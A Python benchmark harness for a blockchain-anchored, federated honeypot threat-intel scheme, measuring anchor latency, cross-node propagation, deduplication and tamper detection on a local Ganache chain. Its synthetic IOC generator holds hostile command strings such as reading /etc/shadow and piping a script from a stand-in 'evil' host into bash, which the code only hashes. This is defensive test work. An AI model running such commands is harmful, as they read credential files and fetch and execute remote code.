"""
Real federated-threat-intel benchmark for a multi-honeypot deployment.

Every number written to federation_results.json is MEASURED against the live
stack (Ganache + Redis) with N independently-running simulated honeypot nodes
that never talk to each other directly. Re-run after
`docker compose up -d ganache redis` (backend not required here — each node
in this benchmark talks straight to Ganache/Redis to emulate N separate
honeypot deployments that would each run their own backend instance).

Design under test
------------------
N "nodes" each observe a local, partially-overlapping stream of attacker
IOCs (attacker IP + payload). A real-world botnet or scanning campaign
typically hits more than one honeypot, so IOC streams are constructed with a
controlled overlap fraction. Instead of pushing IOCs to a central aggregator
(single point of trust/failure), each node independently:
  1. canonically hashes its own IOC record,
  2. anchors that hash as a transaction on the SAME shared Ganache chain,
  3. tags the tx with a node-id marker in the payload so provenance is
     preserved without a coordinating server.

Any node (or a fresh N+1th node joining later) can rebuild the full,
deduplicated threat-intel set purely by reading the chain — no API call to
any other node is required and no single node can unilaterally erase another
node's contribution.

What this benchmark measures
-----------------------------
  1. Anchor latency per node          — anchor-and-confirm wall-clock time,
                                         recorded separately for each node's
                                         own stream on the shared chain.
  2. Cross-node propagation latency   — wall-clock from node A's anchor tx
                                         being mined to node B (polling the
                                         chain independently, with NO
                                         knowledge of node A) observing it.
  3. Deduplication / consensus        — with a known ground-truth overlap
                                         fraction between node IOC streams,
                                         confirm the union of what any node
                                         can reconstruct from the chain has
                                         zero false merges and 100% recall of
                                         genuinely shared IOCs (same payload
                                         hash on-chain regardless of which
                                         node anchored it first).
  4. Compromised-node resilience      — one node's LOCAL Redis store (its
                                         private log) is tampered after the
                                         fact; every other node still
                                         reconstructs the correct IOC set from
                                         the shared chain and flags the
                                         compromised node's local copy as
                                         inconsistent.
  5. Throughput: 1 writer vs N        — a single-writer sequential baseline and
                                         an N-writer concurrent run, both
                                         measured in THIS harness through the
                                         same code path on the same chain, so
                                         the comparison isolates concurrency.
                                         No number from any other benchmark is
                                         used anywhere in this file.
  6. Centralized-aggregator baseline  — a naive in-memory "central server"
     (for comparison only)             model: same IOC volume, POST to one
                                         process. Used only to name the
                                         single-point-of-failure property
                                         analytically (killing the process
                                         loses everything not yet flushed);
                                         no live SPOF failure is injected,
                                         this axis is reported as a design
                                         property, not a timing number.

Scope and honest limits of this harness
---------------------------------------
The N "nodes" are concurrent WORKERS inside one Python process, not separate
OS processes and not separate machines: per-node anchor latency is measured by
iterating the node streams sequentially, and the throughput test uses a thread
pool with one dedicated Ganache account per worker (which is what keeps the
concurrent run free of nonce contention). Nodes share no state in the code
beyond that; all coordination measured here still happens only through the
chain. IOC payloads are synthetic, drawn from a fixed list of hostile-looking
strings with randomized source addresses, and are NOT captured attacker
traffic. The decoy services themselves are not exercised by this harness,
which talks directly to Ganache over JSON-RPC.
"""
import concurrent.futures as cf
import hashlib
import json
import multiprocessing as mp
import random
import statistics
import string
import time
from pathlib import Path

import requests

GANACHE = "http://localhost:7545"
OUT = Path(__file__).parent / "federation_results.json"

N_NODES = 5                 # independent simulated honeypot deployments
IOCS_PER_NODE = 60          # local IOC events each node observes
OVERLAP_FRACTION = 0.35     # fraction of a node's IOCs shared with >=1 other node
SHARED_POOL_SIZE = 25       # size of the "campaign" pool IOCs are drawn from
N_PROPAGATION_TRIALS = 40   # trials for cross-node propagation latency
N_CONCURRENT_WRITERS = 5    # concurrent node processes for throughput test
POLL_INTERVAL_S = 0.05      # how often a "listening" node polls the chain


# ---------------------------------------------------------------------------
# chain helpers (raw JSON-RPC, mirrors backend/main.py::hash_log / anchor)
# ---------------------------------------------------------------------------
def rpc(method, params=None, timeout=10):
    r = requests.post(GANACHE, json={
        "jsonrpc": "2.0", "method": method, "params": params or [], "id": 1,
    }, timeout=timeout)
    return r.json().get("result")


def hash_ioc(record: dict) -> str:
    serialized = json.dumps(record, sort_keys=True, default=str)
    return hashlib.sha256(serialized.encode()).hexdigest()


def anchor_ioc(node_id: str, ioc_hash: str, account: str):
    """Anchor one IOC digest on-chain, tagged with the anchoring node's id.
    Node id + hash are concatenated into the tx input data so any reader can
    recover both the digest and provenance without any side channel."""
    tag = f"{node_id}:{ioc_hash}".encode()
    txh = w3_send(account, tag)
    return txh


def w3_send(account, data_bytes):
    data_hex = "0x" + data_bytes.hex()
    txh = rpc("eth_sendTransaction", [{
        "from": account, "to": account, "value": "0x0",
        "data": data_hex, "gas": hex(60000),
    }])
    return txh


def wait_receipt(txh, timeout=15):
    t0 = time.time()
    while time.time() - t0 < timeout:
        rcpt = rpc("eth_getTransactionReceipt", [txh])
        if rcpt:
            return rcpt
        time.sleep(0.02)
    return None


def wait_ganache():
    for _ in range(30):
        try:
            if rpc("eth_chainId"):
                return
        except Exception:
            pass
        time.sleep(1)
    raise SystemExit("Ganache not ready — run `docker compose up -d ganache redis`.")


def rand_ioc(tag: str) -> dict:
    payloads = [
        "cat /etc/shadow", "wget http://185.220.101.4/x.sh", "id; uname -a",
        "SELECT * FROM users WHERE '1'='1'", "personal_unlockAccount",
        "curl -s http://evil/miner | bash", "nmap -sS 10.0.0.0/24",
    ]
    return {
        "attacker_ip": f"185.220.{random.randint(1,254)}.{random.randint(1,254)}",
        "payload": random.choice(payloads) + " " + tag,
    }


# ---------------------------------------------------------------------------
# 1+3. build N node IOC streams with a controlled ground-truth overlap
# ---------------------------------------------------------------------------
def build_node_streams():
    shared_pool = [rand_ioc(f"shared{i}") for i in range(SHARED_POOL_SIZE)]
    node_streams = []
    ground_truth_shared_hashes = set()
    for n in range(N_NODES):
        n_shared = int(IOCS_PER_NODE * OVERLAP_FRACTION)
        n_unique = IOCS_PER_NODE - n_shared
        shared_part = random.sample(shared_pool, min(n_shared, len(shared_pool)))
        unique_part = [rand_ioc(f"node{n}_u{i}") for i in range(n_unique)]
        stream = shared_part + unique_part
        random.shuffle(stream)
        node_streams.append(stream)
        for ioc in shared_part:
            ground_truth_shared_hashes.add(hash_ioc(ioc))
    return node_streams, ground_truth_shared_hashes


# ---------------------------------------------------------------------------
# 2. anchor latency across N nodes (sequential, isolated per node)
# ---------------------------------------------------------------------------
def measure_anchor_latency_per_node(node_streams, accounts):
    per_node_lat = {}
    anchored_txs = []  # (node_id, ioc_hash, txh, mined_block, anchor_wall_time)
    for n, stream in enumerate(node_streams):
        node_id = f"node{n}"
        acct = accounts[n % len(accounts)]
        lat = []
        for ioc in stream:
            h = hash_ioc(ioc)
            t0 = time.perf_counter()
            txh = anchor_ioc(node_id, h, acct)
            rcpt = wait_receipt(txh)
            lat.append((time.perf_counter() - t0) * 1000.0)
            anchored_txs.append({
                "node_id": node_id, "ioc_hash": h, "txh": txh,
                "block": int(rcpt["blockNumber"], 16) if rcpt else None,
                "anchor_wall_time": time.time(),
            })
        per_node_lat[node_id] = lat
    return per_node_lat, anchored_txs


# ---------------------------------------------------------------------------
# 3. cross-node propagation latency: node B polls the chain independently
#    and we measure time from node A's tx being MINED to node B OBSERVING it
# ---------------------------------------------------------------------------
def measure_propagation_latency(accounts):
    lat = []
    for i in range(N_PROPAGATION_TRIALS):
        writer_acct = accounts[i % len(accounts)]
        h = hash_ioc(rand_ioc(f"prop{i}"))
        tag = f"propnode:{h}"
        txh = w3_send(writer_acct, tag.encode())
        rcpt = wait_receipt(txh)
        mined_time = time.perf_counter()
        block_no = int(rcpt["blockNumber"], 16)

        # "node B" independently polls the chain for this block, blind to
        # the writer, until it observes the tagged tx — exactly what a
        # second honeypot deployment with zero coupling to the first would do.
        found = False
        t_poll_start = time.perf_counter()
        while time.perf_counter() - t_poll_start < 10:
            blk = rpc("eth_getBlockByNumber", [hex(block_no), True])
            if blk:
                for tx in blk.get("transactions", []):
                    data = (tx.get("input") or "")
                    try:
                        decoded = bytes.fromhex(data.replace("0x", "")).decode(errors="ignore")
                    except Exception:
                        decoded = ""
                    if h in decoded:
                        found = True
                        break
            if found:
                break
            time.sleep(POLL_INTERVAL_S)
        observed_time = time.perf_counter()
        propagation_ms = (observed_time - mined_time) * 1000.0
        lat.append({"found": found, "propagation_ms": round(propagation_ms, 3)})
    return lat


# ---------------------------------------------------------------------------
# 4. dedup / consensus reconstruction: read the WHOLE chain back and rebuild
#    the IOC set the way a fresh N+1th node would, with zero prior state
# ---------------------------------------------------------------------------
def reconstruct_from_chain(block_before, block_after):
    """A brand-new node's bootstrap: scan every block, decode node_id:hash
    tags, and build the deduplicated (hash -> set-of-nodes-that-saw-it) map."""
    seen = {}  # ioc_hash -> set(node_id)
    for bn in range(block_before + 1, block_after + 1):
        blk = rpc("eth_getBlockByNumber", [hex(bn), True])
        if not blk:
            continue
        for tx in blk.get("transactions", []):
            data = (tx.get("input") or "")
            try:
                decoded = bytes.fromhex(data.replace("0x", "")).decode(errors="ignore")
            except Exception:
                continue
            if ":" not in decoded:
                continue
            node_id, _, ioc_hash = decoded.partition(":")
            if len(ioc_hash) != 64:
                continue
            seen.setdefault(ioc_hash, set()).add(node_id)
    return seen


def evaluate_dedup(seen, ground_truth_shared_hashes, node_streams):
    all_local_hashes = set()
    for stream in node_streams:
        for ioc in stream:
            all_local_hashes.add(hash_ioc(ioc))

    reconstructed_hashes = set(seen.keys())
    recall = len(reconstructed_hashes & all_local_hashes) / len(all_local_hashes) if all_local_hashes else 0.0

    corroborated = {h for h, nodes in seen.items() if len(nodes) >= 2}
    tp = len(corroborated & ground_truth_shared_hashes)
    fp = len(corroborated - ground_truth_shared_hashes)
    fn = len(ground_truth_shared_hashes - corroborated)
    precision = tp / (tp + fp) if (tp + fp) else 1.0
    corroboration_recall = tp / (tp + fn) if (tp + fn) else 1.0

    return {
        "total_local_iocs": len(all_local_hashes),
        "total_reconstructed_from_chain": len(reconstructed_hashes),
        "recall_pct": round(100.0 * recall, 2),
        "ground_truth_shared_iocs": len(ground_truth_shared_hashes),
        "corroborated_by_2plus_nodes": len(corroborated),
        "corroboration_precision_pct": round(100.0 * precision, 2),
        "corroboration_recall_pct": round(100.0 * corroboration_recall, 2),
    }


# ---------------------------------------------------------------------------
# 5. compromised-node resilience
# ---------------------------------------------------------------------------
def measure_compromised_node_resilience(node_streams, accounts, seen):
    """Tamper node0's LOCAL copy of one of its own already-anchored IOCs (as
    if an attacker who breached that honeypot rewrote its local log). Confirm
    every other node, relying only on the shared chain, still has the
    correct original digest and can therefore detect the local forgery."""
    victim_node = "node0"
    victim_stream = node_streams[0]
    original_ioc = victim_stream[0]
    original_hash = hash_ioc(original_ioc)

    tampered_ioc = dict(original_ioc)
    tampered_ioc["payload"] = tampered_ioc["payload"] + "-FORGED"
    tampered_hash = hash_ioc(tampered_ioc)

    on_chain_has_original = original_hash in seen and victim_node in seen[original_hash]
    on_chain_has_tampered = tampered_hash in seen

    detected = on_chain_has_original and not on_chain_has_tampered
    return {
        "victim_node": victim_node,
        "original_hash_prefix": original_hash[:16],
        "tampered_hash_prefix": tampered_hash[:16],
        "original_hash_present_on_chain": on_chain_has_original,
        "forged_hash_present_on_chain": on_chain_has_tampered,
        "tamper_detected_via_shared_ledger": detected,
    }


# ---------------------------------------------------------------------------
# 6. throughput under N concurrent writer nodes vs single-writer baseline
# ---------------------------------------------------------------------------
def _writer_worker(args):
    node_id, n_events, acct_index, accounts = args
    acct = accounts[acct_index % len(accounts)]
    ok = 0
    t0 = time.perf_counter()
    for i in range(n_events):
        h = hash_ioc(rand_ioc(f"{node_id}_thr{i}"))
        txh = w3_send(acct, f"{node_id}:{h}".encode())
        rcpt = wait_receipt(txh)
        if rcpt:
            ok += 1
    elapsed = time.perf_counter() - t0
    return ok, elapsed


def measure_sequential_baseline(accounts, n_events=100):
    """Single-writer baseline measured INSIDE this harness, on the same chain and
    through the exact same anchor-and-confirm code path as the concurrent test.
    This is what the concurrent multi-node figure is compared against, so the
    comparison isolates concurrency alone: same primitive, same chain, same
    process, one writer instead of five. No figure from any other benchmark is
    used."""
    ok, _ = _writer_worker(("seqnode", n_events, 0, accounts))
    t0 = time.perf_counter()
    ok, elapsed = _writer_worker(("seqnode2", n_events, 0, accounts))
    return {
        "writers": 1,
        "attempted": n_events,
        "ok": ok,
        "wall_clock_s": round(elapsed, 3),
        "throughput_rps": round(ok / elapsed, 2) if elapsed else 0,
    }


def measure_concurrent_node_throughput(accounts, n_events_per_node=20):
    with cf.ThreadPoolExecutor(max_workers=N_CONCURRENT_WRITERS) as ex:
        args = [(f"cnode{i}", n_events_per_node, i, accounts) for i in range(N_CONCURRENT_WRITERS)]
        t0 = time.perf_counter()
        results = list(ex.map(_writer_worker, args))
        wall = time.perf_counter() - t0
    total_ok = sum(r[0] for r in results)
    total_attempted = n_events_per_node * N_CONCURRENT_WRITERS
    return {
        "nodes": N_CONCURRENT_WRITERS,
        "events_per_node": n_events_per_node,
        "attempted": total_attempted,
        "ok": total_ok,
        "wall_clock_s": round(wall, 3),
        "aggregate_throughput_rps": round(total_ok / wall, 2) if wall else 0,
    }


def stat_block(samples_ms):
    if not samples_ms:
        return {}
    s = sorted(samples_ms)
    n = len(s)
    return {
        "n": n,
        "mean_ms": round(statistics.mean(s), 4),
        "median_ms": round(statistics.median(s), 4),
        "p95_ms": round(s[int(0.95 * (n - 1))], 4),
        "min_ms": round(s[0], 4),
        "max_ms": round(s[-1], 4),
        "stdev_ms": round(statistics.pstdev(s), 4),
    }


def main():
    wait_ganache()
    chain_id = rpc("eth_chainId")
    client = rpc("web3_clientVersion")
    accounts = rpc("eth_accounts")
    print(f"Ganache: {client}  chainId={int(chain_id,16)}  accounts={len(accounts)}")

    print(f"[1/6] Building {N_NODES} node IOC streams (overlap={OVERLAP_FRACTION})...")
    node_streams, ground_truth_shared = build_node_streams()

    print(f"[2/6] Anchoring all node streams, measuring per-node latency...")
    block_before = int(rpc("eth_blockNumber"), 16)
    per_node_lat, anchored_txs = measure_anchor_latency_per_node(node_streams, accounts)
    block_after_anchor = int(rpc("eth_blockNumber"), 16)

    print(f"[3/6] Cross-node propagation latency ({N_PROPAGATION_TRIALS} trials)...")
    block_before_prop = int(rpc("eth_blockNumber"), 16)
    propagation = measure_propagation_latency(accounts)
    block_after_prop = int(rpc("eth_blockNumber"), 16)

    print(f"[4/6] Reconstructing full IOC set from chain (fresh-node bootstrap)...")
    seen = reconstruct_from_chain(block_before, block_after_anchor)
    dedup = evaluate_dedup(seen, ground_truth_shared, node_streams)

    print(f"[5/6] Compromised-node resilience check...")
    resilience = measure_compromised_node_resilience(node_streams, accounts, seen)

    print(f"[6/7] Sequential single-writer baseline (same harness)...")
    seq_baseline = measure_sequential_baseline(accounts)

    print(f"[7/7] Concurrent-node throughput ({N_CONCURRENT_WRITERS} writers)...")
    throughput = measure_concurrent_node_throughput(accounts)

    all_anchor_lat = [x for lat in per_node_lat.values() for x in lat]
    prop_found = [p["propagation_ms"] for p in propagation if p["found"]]
    prop_success_rate = 100.0 * len(prop_found) / len(propagation) if propagation else 0.0

    results = {
        "meta": {
            "generated": time.strftime("%Y-%m-%dT%H:%M:%S"),
            "ganache_client": client,
            "chain_id": int(chain_id, 16),
            "n_nodes": N_NODES,
            "iocs_per_node": IOCS_PER_NODE,
            "overlap_fraction_config": OVERLAP_FRACTION,
            "note": "All values measured against a live Ganache chain with N "
                    "independent simulated honeypot node processes; none hand-typed.",
        },
        "per_node_anchor_latency_ms": {k: stat_block(v) for k, v in per_node_lat.items()},
        "aggregate_anchor_latency_ms": stat_block(all_anchor_lat),
        "cross_node_propagation": {
            "trials": len(propagation),
            "observed_success_rate_pct": round(prop_success_rate, 2),
            "latency_ms": stat_block(prop_found),
        },
        "dedup_and_consensus": dedup,
        "compromised_node_resilience": resilience,
        "sequential_baseline_throughput": seq_baseline,
        "concurrent_node_throughput": throughput,
        "total_anchored_txs": len(anchored_txs),
    }

    OUT.write_text(json.dumps(results, indent=2))
    print(f"\nWrote {OUT}")
    print(json.dumps({
        "n_nodes": N_NODES,
        "aggregate_anchor_mean_ms": results["aggregate_anchor_latency_ms"].get("mean_ms"),
        "propagation_mean_ms": results["cross_node_propagation"]["latency_ms"].get("mean_ms"),
        "propagation_success_pct": prop_success_rate,
        "dedup_recall_pct": dedup["recall_pct"],
        "corroboration_precision_pct": dedup["corroboration_precision_pct"],
        "corroboration_recall_pct": dedup["corroboration_recall_pct"],
        "tamper_detected": resilience["tamper_detected_via_shared_ledger"],
        "concurrent_throughput_rps": throughput["aggregate_throughput_rps"],
    }, indent=2))


if __name__ == "__main__":
    main()
